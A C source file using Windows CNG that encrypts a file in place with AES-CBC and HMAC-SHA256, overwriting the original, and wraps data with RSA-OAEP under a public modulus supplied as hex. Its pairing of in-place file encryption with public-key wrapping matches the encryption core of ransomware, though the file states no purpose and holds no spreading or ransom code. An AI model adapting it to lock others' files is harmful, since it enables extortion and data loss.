#include "aes.h"
#include "utils.h"
#include "common.h"

int generate_random_key(unsigned char *key, size_t key_len) {
    if (!key || key_len == 0)
        return ERR_INVALID_ARG;
    int err = ERR_SUCCESS;
    BCRYPT_ALG_HANDLE h_alg = NULL;
    NTSTATUS status = BCryptOpenAlgorithmProvider(&h_alg, BCRYPT_RNG_ALGORITHM, NULL, 0);
    if (!BCRYPT_SUCCESS(status)) {
        err = ERR_CRYPTO_OP;
        return err;
    }
    status = BCryptGenRandom(h_alg, key, (ULONG)key_len, 0);
    BCryptCloseAlgorithmProvider(h_alg, 0);
    if (!BCRYPT_SUCCESS(status))
        err = ERR_CRYPTO_OP;
    return err;
}

int compute_hmac(const unsigned char *key, const unsigned char *data, size_t data_len, unsigned char *hmac) {
    int err = ERR_SUCCESS;
    BCRYPT_ALG_HANDLE h_alg = NULL;
    BCRYPT_HASH_HANDLE h_hash = NULL;
    NTSTATUS status = BCryptOpenAlgorithmProvider(&h_alg, BCRYPT_SHA256_ALGORITHM, NULL, BCRYPT_ALG_HANDLE_HMAC_FLAG);
    if (!BCRYPT_SUCCESS(status)) {
        err = ERR_CRYPTO_OP;
        return err;
    }
    status = BCryptCreateHash(h_alg, &h_hash, NULL, 0, (PUCHAR)key, AES_KEY_SIZE, 0);
    if (!BCRYPT_SUCCESS(status)) {
        err = ERR_CRYPTO_OP;
        goto cleanup;
    }
    status = BCryptHashData(h_hash, (PUCHAR)data, (ULONG)data_len, 0);
    if (!BCRYPT_SUCCESS(status)) {
        err = ERR_CRYPTO_OP;
        goto cleanup;
    }
    status = BCryptFinishHash(h_hash, hmac, HMAC_SIZE, 0);
    if (!BCRYPT_SUCCESS(status)) {
        err = ERR_CRYPTO_OP;
        goto cleanup;
    }
    BCryptDestroyHash(h_hash);
    BCryptCloseAlgorithmProvider(h_alg, 0);
    return err;
cleanup:
    if (h_hash)
        BCryptDestroyHash(h_hash);
    if (h_alg)
        BCryptCloseAlgorithmProvider(h_alg, 0);
    return err;
}

int derive_hmac_key(const unsigned char *aes_key, unsigned char *hmac_key) {
    int err = ERR_SUCCESS;
    unsigned char zero_salt[HMAC_SIZE] = {0};
    unsigned char prk[HMAC_SIZE];
    if (compute_hmac(zero_salt, aes_key, AES_KEY_SIZE, prk) != ERR_SUCCESS) {
        err = ERR_CRYPTO_OP;
        return err;
    }
    const char *info = "hmac_key";
    size_t info_len = strlen(info);
    unsigned char input[info_len + 1];
    memcpy(input, info, info_len);
    input[info_len] = 0x01;
    int ret = compute_hmac(prk, input, info_len + 1, hmac_key);
    zero_memory(prk, sizeof(prk));
    if (ret != ERR_SUCCESS)
        err = ERR_CRYPTO_OP;
    return err;
}

// Encrypts a file using AES-CBC with HMAC for integrity.
// Process: Generate IV, derive HMAC key, encrypt chunks, compute HMAC over ciphertext, write IV + ciphertext + HMAC.
int encrypt_file_aes_cbc(const char *filepath, const unsigned char *key) {
    int err = ERR_SUCCESS;
    if (!filepath || !key) {
        err = ERR_INVALID_ARG;
        return err;
    }
    HANDLE h_input = INVALID_HANDLE_VALUE;
    HANDLE h_output = INVALID_HANDLE_VALUE;
    BCRYPT_ALG_HANDLE h_alg = NULL;
    BCRYPT_KEY_HANDLE h_key = NULL;
    BCRYPT_ALG_HANDLE h_hmac_alg = NULL;
    BCRYPT_HASH_HANDLE h_hmac = NULL;
    unsigned char iv[IV_SIZE];
    BOOL success = FALSE;
    DWORD bytes_read = 0, bytes_written = 0;
    unsigned char buffer[BUFFER_CHUNK_SIZE];
    ULONG encrypted_len = 0;
    NTSTATUS status;
    char temp_file[MAX_PATH] = {0};
    unsigned char hmac_key[HMAC_SIZE];
    if (_snprintf_s(temp_file, sizeof(temp_file), _TRUNCATE, "%s.tmp", filepath) == -1) {
        err = ERR_GENERAL;
        return err;
    }
    if (generate_random_key(iv, sizeof(iv)) != ERR_SUCCESS) {
        err = ERR_CRYPTO_OP;
        return err;
    }
    if (derive_hmac_key(key, hmac_key) != ERR_SUCCESS) {
        err = ERR_CRYPTO_OP;
        return err;
    }
    h_input = CreateFileA(filepath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h_input == INVALID_HANDLE_VALUE) {
        err = ERR_FILE_OPEN;
        goto cleanup;
    }
    h_output = CreateFileA(temp_file, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h_output == INVALID_HANDLE_VALUE) {
        err = ERR_FILE_OPEN;
        goto cleanup;
    }
    success = WriteFile(h_output, iv, sizeof(iv), &bytes_written, NULL);
    if (!success || bytes_written != sizeof(iv)) {
        err = ERR_GENERAL;
        goto cleanup;
    }
    status = BCryptOpenAlgorithmProvider(&h_alg, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (!BCRYPT_SUCCESS(status)) {
        err = ERR_CRYPTO_OP;
        goto cleanup;
    }
    status = BCryptSetProperty(h_alg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    if (!BCRYPT_SUCCESS(status)) {
        err = ERR_CRYPTO_OP;
        goto cleanup;
    }
    status = BCryptGenerateSymmetricKey(h_alg, &h_key, NULL, 0, (PUCHAR)key, AES_KEY_SIZE, 0);
    if (!BCRYPT_SUCCESS(status)) {
        err = ERR_CRYPTO_OP;
        goto cleanup;
    }
    status = BCryptSetProperty(h_key, BCRYPT_INITIALIZATION_VECTOR, iv, sizeof(iv), 0);
    if (!BCRYPT_SUCCESS(status)) {
        err = ERR_CRYPTO_OP;
        goto cleanup;
    }
    status = BCryptOpenAlgorithmProvider(&h_hmac_alg, BCRYPT_SHA256_ALGORITHM, NULL, BCRYPT_ALG_HANDLE_HMAC_FLAG);
    if (!BCRYPT_SUCCESS(status)) {
        err = ERR_CRYPTO_OP;
        goto cleanup;
    }
    status = BCryptCreateHash(h_hmac_alg, &h_hmac, NULL, 0, hmac_key, HMAC_SIZE, 0);
    if (!BCRYPT_SUCCESS(status)) {
        err = ERR_CRYPTO_OP;
        goto cleanup;
    }
    unsigned char *temp_enc = NULL;
    while (ReadFile(h_input, buffer, sizeof(buffer), &bytes_read, NULL)) {
        if (bytes_read == 0) {
            break;
        }
        ULONG flags = (bytes_read < sizeof(buffer)) ? BCRYPT_BLOCK_PADDING : 0;
        status = BCryptEncrypt(h_key, buffer, bytes_read, NULL, NULL, 0, NULL, 0, &encrypted_len, flags);
        if (!BCRYPT_SUCCESS(status)) {
            err = ERR_CRYPTO_OP;
            goto cleanup;
        }
        temp_enc = malloc(encrypted_len);
        if (!temp_enc) {
            err = ERR_MEMORY_ALLOC;
            goto cleanup;
        }
        status = BCryptEncrypt(h_key, buffer, bytes_read, NULL, NULL, 0, temp_enc, encrypted_len, &encrypted_len, flags);
        if (!BCRYPT_SUCCESS(status)) {
            err = ERR_CRYPTO_OP;
            free(temp_enc);
            temp_enc = NULL;
            goto cleanup;
        }
        status = BCryptHashData(h_hmac, temp_enc, encrypted_len, 0);
        if (!BCRYPT_SUCCESS(status)) {
            err = ERR_CRYPTO_OP;
            free(temp_enc);
            temp_enc = NULL;
            goto cleanup;
        }
        success = WriteFile(h_output, temp_enc, encrypted_len, &bytes_written, NULL);
        free(temp_enc);
        temp_enc = NULL;
        if (!success || bytes_written != encrypted_len) {
            err = ERR_GENERAL;
            goto cleanup;
        }
    }
    unsigned char hmac[HMAC_SIZE];
    status = BCryptFinishHash(h_hmac, hmac, sizeof(hmac), 0);
    if (!BCRYPT_SUCCESS(status)) {
        err = ERR_CRYPTO_OP;
        goto cleanup;
    }
    success = WriteFile(h_output, hmac, sizeof(hmac), &bytes_written, NULL);
    if (!success || bytes_written != sizeof(hmac)) {
        err = ERR_GENERAL;
        goto cleanup;
    }
    if (h_input != INVALID_HANDLE_VALUE) {
        CloseHandle(h_input);
        h_input = INVALID_HANDLE_VALUE;
    }
    if (h_output != INVALID_HANDLE_VALUE) {
        CloseHandle(h_output);
        h_output = INVALID_HANDLE_VALUE;
    }
    if (!MoveFileExA(temp_file, filepath, MOVEFILE_REPLACE_EXISTING)) {
        DeleteFileA(temp_file);
        err = ERR_GENERAL;
        goto cleanup;
    }
    zero_memory(hmac_key, sizeof(hmac_key));
    return err;
cleanup:
    zero_memory(hmac_key, sizeof(hmac_key));
    if (temp_enc) {
        free(temp_enc);
    }
    if (h_hmac) {
        BCryptDestroyHash(h_hmac);
    }
    if (h_hmac_alg) {
        BCryptCloseAlgorithmProvider(h_hmac_alg, 0);
    }
    if (h_key) {
        BCryptDestroyKey(h_key);
    }
    if (h_alg) {
        BCryptCloseAlgorithmProvider(h_alg, 0);
    }
    if (h_input != INVALID_HANDLE_VALUE) {
        CloseHandle(h_input);
    }
    if (h_output != INVALID_HANDLE_VALUE) {
        CloseHandle(h_output);
        DeleteFileA(temp_file);
    }
    return err;
}

int encrypt_rsa_oaep(const unsigned char *data, size_t data_len, const char *rsa_n_hex, unsigned char **encrypted_key, size_t *encrypted_len) {
    int err = ERR_SUCCESS;
    if (!data || data_len == 0 || !rsa_n_hex || !encrypted_key || !encrypted_len) {
        err = ERR_INVALID_ARG;
        return err;
    }
    size_t hex_len = strlen(rsa_n_hex);
    if (hex_len != 2 * RSA_MODULUS_SIZE) {
        err = ERR_INVALID_ARG;
        return err;
    }
    BCRYPT_ALG_HANDLE h_alg = NULL;
    BCRYPT_KEY_HANDLE h_key = NULL;
    NTSTATUS status;
    unsigned char n_bytes[RSA_MODULUS_SIZE];
    unsigned char *key_blob = NULL;
    if (hex_to_bytes(rsa_n_hex, n_bytes, sizeof(n_bytes)) != ERR_SUCCESS) {
        err = ERR_GENERAL;
        return err;
    }
    reverse_bytes(n_bytes, sizeof(n_bytes));
    BCRYPT_RSAKEY_BLOB blob = {0};
    blob.Magic = BCRYPT_RSAPUBLIC_MAGIC;
    blob.BitLength = RSA_BIT_LENGTH;
    blob.cbPublicExp = RSA_EXPONENT_BYTES;
    blob.cbModulus = sizeof(n_bytes);
    blob.cbPrime1 = 0;
    blob.cbPrime2 = 0;
    unsigned char exponent[RSA_EXPONENT_BYTES] = {0x01, 0x00, 0x01};
    size_t blob_size = sizeof(BCRYPT_RSAKEY_BLOB) + blob.cbPublicExp + blob.cbModulus;
    key_blob = malloc(blob_size);
    if (!key_blob) {
        err = ERR_MEMORY_ALLOC;
        return err;
    }
    memcpy(key_blob, &blob, sizeof(BCRYPT_RSAKEY_BLOB));
    memcpy(key_blob + sizeof(BCRYPT_RSAKEY_BLOB), exponent, blob.cbPublicExp);
    memcpy(key_blob + sizeof(BCRYPT_RSAKEY_BLOB) + blob.cbPublicExp, n_bytes, blob.cbModulus);
    status = BCryptOpenAlgorithmProvider(&h_alg, BCRYPT_RSA_ALGORITHM, NULL, 0);
    if (!BCRYPT_SUCCESS(status)) {
        err = ERR_CRYPTO_OP;
        free(key_blob);
        return err;
    }
    status = BCryptImportKeyPair(h_alg, NULL, BCRYPT_RSAPUBLIC_BLOB, &h_key, key_blob, (ULONG)blob_size, 0);
    free(key_blob);
    if (!BCRYPT_SUCCESS(status)) {
        err = ERR_CRYPTO_OP;
        goto cleanup;
    }
    BCRYPT_OAEP_PADDING_INFO padding_info = { BCRYPT_SHA256_ALGORITHM, NULL, 0 };
    status = BCryptEncrypt(h_key, (PUCHAR)data, (ULONG)data_len, &padding_info, NULL, 0, NULL, 0, (ULONG*)encrypted_len, BCRYPT_PAD_OAEP);
    if (!BCRYPT_SUCCESS(status)) {
        err = ERR_CRYPTO_OP;
        goto cleanup;
    }
    *encrypted_key = malloc(*encrypted_len);
    if (!*encrypted_key) {
        err = ERR_MEMORY_ALLOC;
        goto cleanup;
    }
    status = BCryptEncrypt(h_key, (PUCHAR)data, (ULONG)data_len, &padding_info, NULL, 0, *encrypted_key, (ULONG)*encrypted_len, (ULONG*)encrypted_len, BCRYPT_PAD_OAEP);
    if (!BCRYPT_SUCCESS(status)) {
        err = ERR_CRYPTO_OP;
        free(*encrypted_key);
        *encrypted_key = NULL;
        goto cleanup;
    }
    BCryptDestroyKey(h_key);
    BCryptCloseAlgorithmProvider(h_alg, 0);
    return err;
cleanup:
    if (h_key)
        BCryptDestroyKey(h_key);
    if (h_alg)
        BCryptCloseAlgorithmProvider(h_alg, 0);
    return err;
}
